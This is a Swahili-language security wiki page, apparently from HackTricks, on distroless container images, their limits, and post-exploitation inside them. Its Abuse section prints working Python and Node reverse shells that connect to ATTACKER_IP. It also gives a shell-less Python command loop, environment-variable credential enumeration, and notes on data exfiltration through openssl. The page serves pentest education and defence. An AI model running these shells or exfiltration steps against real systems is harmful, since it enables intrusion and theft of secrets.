# Distroless Containers

{{#include ../../../banners/hacktricks-training.md}}

## Muhtasari

**distroless** container image ni image inayosafirisha **minimum runtime components zinazohitajika kuendesha application moja maalum**, huku ikiondoa kwa makusudi distribution tooling za kawaida kama package managers, shells, na seti kubwa za generic userland utilities. Kwa vitendo, distroless images mara nyingi huwa na application binary au runtime pekee, shared libraries zake, certificate bundles, na filesystem layout ndogo sana.

Lengo si kwamba distroless ni kernel isolation primitive mpya. Distroless ni **image design strategy**. Inabadilisha vinavyopatikana **ndani ya container filesystem**, si jinsi kernel inavyotenga container. Tofauti hiyo ni muhimu, kwa sababu distroless huimarisha mazingira hasa kwa kupunguza vitu ambavyo attacker anaweza kutumia baada ya kupata code execution. Haibadilishi namespaces, seccomp, capabilities, AppArmor, SELinux, au runtime isolation mechanism nyingine yoyote.

## Kwa Nini Distroless Ipo

Distroless images hutumiwa hasa kupunguza:

- image size
- operational complexity ya image
- idadi ya packages na binaries zinazoweza kuwa na vulnerabilities
- idadi ya post-exploitation tools zinazopatikana kwa attacker kwa default

Ndiyo maana distroless images ni maarufu katika production application deployments. Container isiyo na shell, package manager, na karibu generic tooling yoyote, kwa kawaida ni rahisi zaidi kueleweka kioperesheni na ni ngumu zaidi kutumiwa vibaya interactively baada ya compromise.

Mifano ya distroless-style image families zinazojulikana ni pamoja na:

- Google's distroless images
- Chainguard hardened/minimal images

## Distroless Haimaanishi Nini

Distroless container **si**:

- automatically rootless
- automatically non-privileged
- automatically read-only
- automatically protected by seccomp, AppArmor, au SELinux
- automatically salama dhidi ya container escape

Bado inawezekana kuendesha distroless image ikiwa na `--privileged`, host namespace sharing, dangerous bind mounts, au mounted runtime socket. Katika hali hiyo, image inaweza kuwa minimal, lakini container bado inaweza kuwa catastrophically insecure. Distroless hubadilisha **userland attack surface**, si **kernel trust boundary**.

## Typical Operational Characteristics

Unapocompromise distroless container, jambo la kwanza unaloligundua kwa kawaida ni kwamba assumptions za kawaida zinaacha kuwa kweli. Huenda kusiwe na `sh`, `bash`, `ls`, `id`, `cat`, na wakati mwingine hata mazingira ya libc-based ambayo yanafanya kazi kama tradecraft yako ya kawaida inavyotarajia. Hii huathiri offense na defense, kwa sababu ukosefu wa tooling hufanya debugging, incident response, na post-exploitation kuwa tofauti.

Patterns zinazotokea mara nyingi ni:

- application runtime ipo, lakini karibu kila kitu kingine hakipo
- shell-based payloads hushindwa kwa sababu hakuna shell
- common enumeration one-liners hushindwa kwa sababu helper binaries hazipo
- filesystem protections kama read-only rootfs au `noexec` kwenye writable tmpfs locations mara nyingi pia huwa zipo

Mchanganyiko huo ndio kwa kawaida huwafanya watu wazungumzie "weaponizing distroless".

## Distroless Na Post-Exploitation

Changamoto kuu ya offensive katika distroless environment si kila mara initial RCE. Mara nyingi ni kinachofuata. Ikiwa exploited workload inakupa code execution katika language runtime kama Python, Node.js, Java, au Go, huenda ukaweza kutekeleza arbitrary logic, lakini si kupitia normal shell-centric workflows ambazo ni za kawaida kwenye Linux targets nyingine.

Hii inamaanisha kuwa post-exploitation mara nyingi hubadilika na kuelekea mojawapo ya njia tatu:

1. **Tumia language runtime iliyopo moja kwa moja** ku-enumerate environment, kufungua sockets, kusoma files, au ku-stage additional payloads.
2. **Leta tooling yako mwenyewe kwenye memory** ikiwa filesystem ni read-only au writable locations zime-mountiwa `noexec`.
3. **Abuse existing binaries ambazo tayari zipo kwenye image** ikiwa application au dependencies zake zina kitu chenye manufaa bila kutarajiwa.

## Abuse

### Enumerate Runtime Uliyonayo Tayari

Katika distroless containers nyingi hakuna shell, lakini bado kuna application runtime. Ikiwa target ni Python service, Python ipo. Ikiwa target ni Node.js, Node ipo. Hiyo mara nyingi hutoa functionality ya kutosha ku-enumerate files, kusoma environment variables, kufungua reverse shells, na ku-stage in-memory execution bila ku-invoke `/bin/sh` hata mara moja.

Mfano rahisi wa Python:
```bash
python3 - <<'PY'
import os, socket, subprocess
print("uid", os.getuid())
print("cwd", os.getcwd())
print("env keys", list(os.environ)[:20])
print("root files", os.listdir("/")[:30])
PY
```
Mfano rahisi wa Node.js:
```bash
node -e 'const fs=require("fs"); console.log(process.getuid && process.getuid()); console.log(fs.readdirSync("/").slice(0,30)); console.log(Object.keys(process.env).slice(0,20));'
```
Athari:

- kurejeshwa kwa environment variables, mara nyingi zikiwa na credentials au service endpoints
- filesystem enumeration bila `/bin/ls`
- utambuzi wa writable paths na mounted secrets

### Reverse Shell Bila `/bin/sh`

Ikiwa image haina `sh` au `bash`, reverse shell ya kawaida inayotegemea shell inaweza kushindwa mara moja. Katika hali hiyo, tumia language runtime iliyosakinishwa badala yake.

Python reverse shell:
```bash
python3 - <<'PY'
import os,pty,socket
s=socket.socket()
s.connect(("ATTACKER_IP",4444))
for fd in (0,1,2):
os.dup2(s.fileno(),fd)
pty.spawn("/bin/sh")
PY
```
Ikiwa `/bin/sh` haipo, badilisha mstari wa mwisho kwa direct Python-driven command execution au Python REPL loop.

Node reverse shell:
```bash
node -e 'var net=require("net"),cp=require("child_process");var s=net.connect(4444,"ATTACKER_IP",function(){var p=cp.spawn("/bin/sh",[]);s.pipe(p.stdin);p.stdout.pipe(s);p.stderr.pipe(s);});'
```
Tena, ikiwa `/bin/sh` haipo, tumia API za Node za filesystem, process, na networking moja kwa moja badala ya kuanzisha shell.

### Full Example: No-Shell Python Command Loop

Ikiwa image ina Python lakini haina shell kabisa, loop rahisi ya interactive mara nyingi inatosha kudumisha uwezo kamili wa post-exploitation:
```bash
python3 - <<'PY'
import os,subprocess
while True:
cmd=input("py> ")
if cmd.strip() in ("exit","quit"):
break
p=subprocess.run(cmd, shell=True, capture_output=True, text=True)
print(p.stdout, end="")
print(p.stderr, end="")
PY
```
Hii haihitaji binary ya interactive shell. Athari kwa mtazamo wa attacker ni ileile kimsingi kama shell ya kawaida: command execution, enumeration, na staging ya payloads zaidi kupitia runtime iliyopo.

### Uendeshaji wa Zana kwenye Kumbukumbu

Distroless images mara nyingi huunganishwa na:

- `readOnlyRootFilesystem: true`
- tmpfs inayoweza kuandikwa lakini yenye `noexec`, kama `/dev/shm`
- ukosefu wa package management tools

Mchanganyiko huo hufanya workflows za kawaida za "download binary to disk and run it" kutokuwa za kuaminika. Katika hali hizo, memory execution techniques huwa jibu kuu.

Ukurasa maalum wa hilo ni:

{{#ref}}
../../linux-basics/bypass-linux-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

Techniques muhimu zaidi humo ni:

- `memfd_create` + `execve` kupitia scripting runtimes
- DDexec / EverythingExec
- memexec
- memdlopen

### Binaries Zilizopo Tayari Kwenye Image

Baadhi ya distroless images bado huwa na binaries zinazohitajika kiutendaji, ambazo huwa muhimu baada ya compromise. Mfano unaoonekana mara kwa mara ni `openssl`, kwa sababu applications wakati mwingine huihitaji kwa kazi zinazohusiana na crypto- au TLS.

Search pattern ya haraka ni:
```bash
find / -type f \( -name openssl -o -name busybox -o -name wget -o -name curl \) 2>/dev/null
```
Ikiwa `openssl` ipo, inaweza kutumika kwa:

- miunganisho ya TLS ya kutoka nje
- data exfiltration kupitia channel ya egress inayoruhusiwa
- kuweka kwa muda data ya payload kupitia blobs zilizowekewa encoding/encryption

Matumizi mabaya halisi yanategemea kile kilichosakinishwa, lakini wazo kuu ni kwamba distroless haimaanishi "hakuna tools kabisa"; inamaanisha "tools chache zaidi kuliko image ya kawaida ya distribution".

## Ukaguzi

Lengo la ukaguzi huu ni kubaini ikiwa image ni distroless kweli kwa vitendo na ni binaries zipi za runtime au helper ambazo bado zinapatikana kwa post-exploitation.
```bash
find / -maxdepth 2 -type f 2>/dev/null | head -n 100          # Very small rootfs is common in distroless images
which sh bash ash busybox python python3 node java 2>/dev/null   # Identify which runtime or shell primitives exist
cat /etc/os-release 2>/dev/null                                # Often missing or minimal
mount | grep -E ' /( |$)|/dev/shm'                             # Check for read-only rootfs and writable tmpfs
```
Nini kinachovutia hapa:

- Ikiwa hakuna shell lakini runtime kama Python au Node ipo, post-exploitation inapaswa kuelekezwa kwenye execution inayoendeshwa na runtime.
- Ikiwa root filesystem ni read-only na `/dev/shm` inaweza kuandikwa lakini ina `noexec`, mbinu za memory execution huwa muhimu zaidi.
- Ikiwa helper binaries kama `openssl`, `busybox`, au `java` zipo, zinaweza kutoa functionality ya kutosha kuanzisha access zaidi.

## Chaguo-msingi za Runtime

| Mtindo wa Image / platform | Hali ya chaguo-msingi | Tabia ya kawaida | Kudhoofisha kwa mikono kwa kawaida |
| --- | --- | --- | --- |
| Google distroless style images | Userland ndogo kwa muundo | Hakuna shell, package manager, ni dependencies za application/runtime pekee | kuongeza debugging layers, sidecar shells, kunakili busybox au tooling |
| Chainguard minimal images | Userland ndogo kwa muundo | Package surface iliyopunguzwa, mara nyingi ikilenga runtime au service moja | kutumia `:latest-dev` au debug variants, kunakili tools wakati wa build |
| Kubernetes workloads zinazotumia distroless images | Inategemea Pod config | Distroless huathiri userland pekee; security posture ya Pod bado inategemea Pod spec na runtime defaults | kuongeza ephemeral debug containers, host mounts, privileged Pod settings |
| Docker / Podman zinazoendesha distroless images | Inategemea run flags | Filesystem ndogo, lakini runtime security bado inategemea flags na daemon configuration | `--privileged`, host namespace sharing, runtime socket mounts, writable host binds |

Jambo kuu ni kwamba distroless ni **sifa ya image**, si protection ya runtime. Thamani yake hutokana na kupunguza vitu vinavyopatikana ndani ya filesystem baada ya compromise.

## Kurasa Zinazohusiana

Kwa filesystem na memory-execution bypasses zinazohitajika mara kwa mara katika mazingira ya distroless:

{{#ref}}
../../linux-basics/bypass-linux-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

Kwa container runtime, socket, na mount abuse ambayo bado inatumika kwa distroless workloads:

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}
{{#include ../../../banners/hacktricks-training.md}}
